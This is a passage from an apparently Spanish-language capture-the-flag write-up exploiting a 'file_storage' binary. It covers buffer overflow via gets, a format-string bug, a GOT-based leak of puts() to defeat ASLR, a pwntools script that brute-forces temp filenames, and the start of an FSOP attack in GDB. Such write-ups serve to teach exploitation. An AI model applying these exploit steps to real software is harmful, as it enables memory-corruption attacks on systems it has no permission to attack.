<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">1. Read contents from a file"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"2. Write data into a random file"</span><span class="mtk1">);</span>  
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"3. Exit"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"&gt; "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">local_c);</span>
<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> local_c;</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="encontrando-vulnerabilidades">Encontrando vulnerabilidades</h3><p>Mirando nuevamente la función <code>main</code>, tenemos estas vulnerabilidades:</p><ul><li>Utiliza <code>gets</code> para tomar la entrada del usuario (datos a escribir en un archivo).</li><li>Hay una instrucción <code>printf(path);</code> que usa como primer argumento una variable que controlada por el usuario (la ruta de un archivo).</li><li>Al leer un archivo, el programa pregunta si contiene <em>strings</em> o un número. Si la respuesta es un número, entonces el archivo se lee como <em>string</em> y se pasa a <code>atoi</code>. Después de eso, el número se pasa directamente a <code>puts</code>. Esto es vulnerable porque <code>puts</code> tomará este número como un puntero a una <em>string</em>.</li></ul><p>Probemos estas vulnerabilidades:</p><ul><li><em>Buffer Overflow</em> en <code>gets</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 2
Enter content:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
zsh: segmentation fault (core dumped)  ./file_storage
</code></pre></div><ul><li>Vulnerabilidad de <em>Format String</em> en <code>printf</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan"></span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 1
Filename: %p
Error: Only '.txt' files are allowed

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 1
Filename: %p.txt
Error: File not found. Please try again  
Debug: /tmp/0x7fffffffbfa0.txt
1. Read contents from a file
2. Write data into a random file
3. Exit
&gt;
</code></pre></div><p>Obsérvese que el programa verifica la extensión <code>.txt</code> del nombre de archivo.</p><ul><li>Fugas de memoria con <code>atoi</code> y <code>puts</code>:</li></ul><p>Para esto, ingresamos un número específico en un archivo de <code>/tmp</code>. Este número es la entrada para <code>puts</code> en la GOT (o cualquier otra función):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -r <span class="mtku">file_storage</span> | <span class="code-dark-green">grep</span> puts
000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 <span class="code-red">puts</span>@GLIBC_2.2.5 + 0  

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print(0x404020)'</span>
4210720

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> 4210720 &gt; /tmp/a.txt

<span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 1
Filename: a.txt
What's in the file? (string/number): number

Do you want to write something? (yes/no): no
Cleaning files...
</code></pre></div><p>No vemos nada porque son caracteres no imprimibles. Además, los archivos se eliminan 5 segundos después de mostrar el mensaje <code>"Cleaning files..."</code>.</p><p>Usemos <code>xxd</code> para ver la fuga de memoria:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> 4210720 &gt; /tmp/a.txt

<span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span> | <span class="code-dark-green">xxd</span>
00000000: 5765 6c63 6f6d 6520 746f 206d 7920 4669  Welcome to my Fi
00000010: 6c65 2053 746f 7261 6765 2028 6265 7461  le Storage (beta
00000020: 293a 0a0a 312e 2052 6561 6420 636f 6e74  ):..1. Read cont
00000030: 656e 7473 2066 726f 6d20 6120 6669 6c65  ents from a file
00000040: 0a32 2e20 5772 6974 6520 6461 7461 2069  .2. Write data i
00000050: 6e74 6f20 6120 7261 6e64 6f6d 2066 696c  nto a random fil
1
00000060: 650a 332e 2045 7869 740a 3e20 4669 6c65  e.3. Exit.&gt; File  
a.txt
00000070: 6e61 6d65 3a20 5768 6174 2773 2069 6e20  name: What's in
00000080: 7468 6520 6669 6c65 3f20 2873 7472 696e  the file? (strin
number
00000090: 672f 6e75 6d62 6572 293a 2020 14b3 96cf  g/number):  ....
000000a0: 7f0a 446f 2079 6f75 2077 616e 7420 746f  ..Do you want to
000000b0: 2077 7269 7465 2073 6f6d 6574 6869 6e67   write something
no
000000c0: 3f20 2879 6573 2f6e 6f29 3a20 436c 6561  ? (yes/no): Clea
000000d0: 6e69 6e67 2066 696c 6573 2e2e 2e0a       ning files....
</code></pre></div><p>Ahí la tenemos: <code>20 14 b3 96 cf 7f</code>, o <code>0x7fcf96b31420</code> como número hexadecimal. Esta es la dirección de <code>puts</code> en tiempo de ejecución, porque es el valor en la entrada de la GOT para <code>puts</code> (<code>0x404020</code>). Y los últimos tres dígitos hexadecimales de la dirección coinciden con los últimos tres dígitos hexadecimales de su <em>offset</em> en Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">' puts@@'</span>
   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15<span class="code-red"> puts@@</span>GLIBC_2.2.5  
</code></pre></div><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>Ahora, planeemos la estrategia de explotación (en local). En primer lugar, algunas consideraciones sobre el programa:</p><ul><li>No podemos usar un <em>exploit</em> de <em>Buffer Overflow</em> típico porque no hay instrucciones de retorno en <code>main</code> (ejecuta <code>exit</code>).</li><li>No podemos explotar completamente la vulnerabilidad de <em>Format String</em> porque el tamaño de nuestra entrada es de 8 bytes máximo (para el nombre de archivo) y debemos ingresar además <code>"txt"</code>.</li><li>El programa permite probar nombres de archivo hasta que encontremos uno válido o salir del programa.</li><li>Si escribimos datos en un archivo, el programa saldrá después.</li><li>El nombre de archivo generado es aleatorio y consta de dos letras mayúsculas (por ejemplo, <code>AB.txt</code> o <code>XD.txt</code>).</li><li>Después de mostrar <code>"Cleaning files..."</code>, los archivos <code>.txt</code> en <code>/tmp</code> se eliminarán después de 5 segundos.</li><li>Si leemos un archivo, tenemos la oportunidad de escribir datos en un archivo.</li></ul><p>Ahora, podemos evitar algunos de estos problemas:</p><ul><li>Podemos ingresar datos en un archivo aleatorio y salir del programa antes de que se realice el borrado.</li><li>Podemos usar fuerza bruta para encontrar el nombre de archivo generado (también podríamos crear un PRNG usando <code>srand(time(0))</code> y <code>rand()</code>, pero puede haber problemas de sincronización).</li><li>Podemos cerrar el proceso antes de que el programa elimine los archivos.</li></ul><p>Para burlar ASLR, la mejor idea es poner la dirección de una entrada GOT en un archivo y, después de eso, leerlo como se mostró antes. De esta manera, obtendremos la dirección de una función dentro de Glibc en tiempo de ejecución, y así calcular la dirección base de GLIBC.</p><p>Comencemos con este <em>script</em> de Python:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'file_storage'</span><span class="mtk1">)</span>
<span class="mtk1">glibc</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'libc.so.6'</span><span class="mtk1">, </span><span class="mtk9 mtki">checksec</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk8">process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">brute_force_filename</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">filename_progress</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">progress</span><span class="mtk1">(</span><span class="mtk4">'Filename'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">a</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">string</span><span class="mtk1">.</span><span class="mtk1">ascii_uppercase</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">string</span><span class="mtk1">.</span><span class="mtk1">ascii_uppercase</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">filename</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">a</span><span class="mtk6">}{</span><span class="mtk1">b</span><span class="mtk6">}</span><span class="mtk4">.txt'</span>
<span class="mtk1">            </span><span class="mtk1">filename_progress</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk1">filename</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Filename: '</span><span class="mtk1">, </span><span class="mtk1">filename</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">            </span><span class="mtk1">msg</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">p</span><span class="mtk1">.recvuntil(</span><span class="mtk7 mtki">b</span><span class="mtk4">':'</span><span class="mtk1">)</span>

<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'Error'</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">msg</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">filename_progress</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk1">filename</span><span class="mtk1">)</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">filename</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">6</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'content:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.puts).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
<span class="mtk1">    </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">filename</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">brute_force_filename</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Filename: '</span><span class="mtk1">, </span><span class="mtk1">filename</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(string/number): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'number'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">puts_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked puts() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">puts_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.puts</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>Obsérvese que iniciamos el programa y salimos solo para limpiar archivos en <code>/tmp/??.txt</code>, por si acaso. Luego, antes de cerrar el proceso, podemos usar <code>sleep(1)</code> para garantizar que el archivo esté escrito correctamente (de lo contrario, los siguientes pasos podrían bloquearse):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1587036
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1587036)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1587095
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1587095)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1587097
[<span class="code-green">+</span>] Filename: OL.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1587097)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1587155
[<span class="code-blue">*</span>] Leaked puts() address: 0x7f4c4506e420
[<span class="code-green">+</span>] Glibc base address: 0x7f4c44fea000
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1587155)
</code></pre></div><p>Genial, revisemos el bloque de código que escribe datos en un archivo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>

<span class="mtk1">  </span><span class="mtk3">// ...</span>

<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> content[</span><span class="mtk6">256</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> path[</span><span class="mtk6">16</span><span class="mtk1">];</span>
<span class="mtk1">  FILE </span><span class="mtk5">*</span><span class="mtk1">fp;</span>

<span class="mtk1">  </span><span class="mtk3">// ...</span>

<span class="mtk1">  </span><span class="mtk8">generate</span><span class="mtk1">(path);</span>
<span class="mtk1">  fp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(path, </span><span class="mtk4">"w"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp </span><span class="mtk5">==</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"fopen() error"</span><span class="mtk1">);</span>
<span class="mtk3">                /* WARNING: Subroutine does not re</span><span class="mtk3">turn */</span>  
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter content:"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">gets</span><span class="mtk1">(content);</span>
<span class="mtk1">  </span><span class="mtk8">fprintf</span><span class="mtk1">(fp, </span><span class="mtk4">" </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, content);</span>
<span class="mtk1">  </span><span class="mtk8">fclose</span><span class="mtk1">(fp);</span>

<span class="mtk1">  </span><span class="mtk3">// ...</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="fsop">FSOP</h3><p>A pesar de no poder controlar la dirección de retorno guardada utilizando la vulnerabilidad de <em>Buffer Overflow</em>, podemos modificar el valor del puntero <code>FILE* fp</code>, para que podamos hacer que <code>fprintf</code> escriba datos arbitrarios en una región de memoria. Esta técnica se llama <em>File Stream Oriented Programming</em> (FSOP).</p><p>Vamos a usar GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">file_storage</span>
Reading symbols from <span class="code-dark-green">file_storage</span>...
(No debugging symbols found in <span class="code-dark-green">file_storage</span>)
<span class="code-red">gef➤  </span>disassemble main
Dump of assembler code for function main:
   <span class="code-dark-blue">0x00000000004014a4</span> &lt;+0&gt;:     endbr64
   ...
   <span class="code-dark-blue">0x000000000040176a</span> &lt;+710&gt;:   call   <span class="code-dark-blue">0x401260</span> &lt;<span class="code-dark-yellow">gets@plt</span>&gt;
   <span class="code-dark-blue">0x000000000040176f</span> &lt;+715&gt;:   lea    rdx,[rbp-0x130]
   <span class="code-dark-blue">0x0000000000401776</span> &lt;+722&gt;:   mov    rax,QWORD PTR [rbp-0x10]
   <span class="code-dark-blue">0x000000000040177a</span> &lt;+726&gt;:   lea    rsi,[rip+0x9ad]        # <span class="code-dark-blue">0x40212e</span>
   <span class="code-dark-blue">0x0000000000401781</span> &lt;+733&gt;:   mov    rdi,rax
   <span class="code-dark-blue">0x0000000000401784</span> &lt;+736&gt;:   mov    eax,0x0
   <span class="code-dark-blue">0x0000000000401789</span> &lt;+741&gt;:   call   <span class="code-dark-blue">0x401240</span> &lt;<span class="code-dark-yellow">fprintf@plt</span>&gt;
   <span class="code-dark-blue">0x000000000040178e</span> &lt;+746&gt;:   mov    rax,QWORD PTR [rbp-0x10]
   <span class="code-dark-blue">0x0000000000401792</span> &lt;+750&gt;:   mov    rdi,rax
   <span class="code-dark-blue">0x0000000000401795</span> &lt;+753&gt;:   call   <span class="code-dark-blue">0x4011b0</span> &lt;<span class="code-dark-yellow">fclose@plt</span>&gt;
   <span class="code-dark-blue">0x000000000040179a</span> &lt;+758&gt;:   jmp    <span class="code-dark-blue">0x4017ab</span> &lt;<span class="code-dark-yellow">main</span>+775&gt;
   <span class="code-dark-blue">0x000000000040179c</span> &lt;+760&gt;:   lea    rdi,[rip+0xa04]        # <span class="code-dark-blue">0x4021a7</span>
   <span class="code-dark-blue">0x00000000004017a3</span> &lt;+767&gt;:   call   <span class="code-dark-blue">0x4011a0</span> &lt;<span class="code-dark-yellow">puts@plt</span>&gt;
   <span class="code-dark-blue">0x00000000004017a8</span> &lt;+772&gt;:   jmp    <span class="code-dark-blue">0x4017ab</span> &lt;<span class="code-dark-yellow">main</span>+775&gt;
   <span class="code-dark-blue">0x00000000004017aa</span> &lt;+774&gt;:   nop
   <span class="code-dark-blue">0x00000000004017ab</span> &lt;+775&gt;:   cmp    DWORD PTR [rbp-0x4],0x0
   <span class="code-dark-blue">0x00000000004017af</span> &lt;+779&gt;:   je     <span class="code-dark-blue">0x4014e4</span> &lt;<span class="code-dark-yellow">main</span>+64&gt;
   <span class="code-dark-blue">0x00000000004017b5</span> &lt;+785&gt;:   lea    rdi,[rip+0x9f0]        # <span class="code-dark-blue">0x4021ac</span>
   <span class="code-dark-blue">0x00000000004017bc</span> &lt;+792&gt;:   call   <span class="code-dark-blue">0x4011a0</span> &lt;<span class="code-dark-yellow">puts@plt</span>&gt;
   <span class="code-dark-blue">0x00000000004017c1</span> &lt;+797&gt;:   mov    edi,0x5
   <span class="code-dark-blue">0x00000000004017c6</span> &lt;+802&gt;:   call   <span class="code-dark-blue">0x4012c0</span> &lt;<span class="code-dark-yellow">sleep@plt</span>&gt;
   <span class="code-dark-blue">0x00000000004017cb</span> &lt;+807&gt;:   lea    rdi,[rip+0x9ec]        # <span class="code-dark-blue">0x4021be</span>
   <span class="code-dark-blue">0x00000000004017d2</span> &lt;+814&gt;:   call   <span class="code-dark-blue">0x4011e0</span> &lt;<span class="code-dark-yellow">system@plt</span>&gt;
   <span class="code-dark-blue">0x00000000004017d7</span> &lt;+819&gt;:   mov    edi,0x0
   <span class="code-dark-blue">0x00000000004017dc</span> &lt;+824&gt;:   call   <span class="code-dark-blue">0x4012b0</span> &lt;<span class="code-dark-yellow">exit@plt</span>&gt;
End of assembler dump.
<span class="code-red">gef➤  </span>break *main+741
Breakpoint 1 at <span class="code-dark-blue">0x401789</span>
<span class="code-red">gef➤  </span>pattern create 500
<span class="code-blue">[+]</span> Generating a pattern of 500 bytes (n=8)
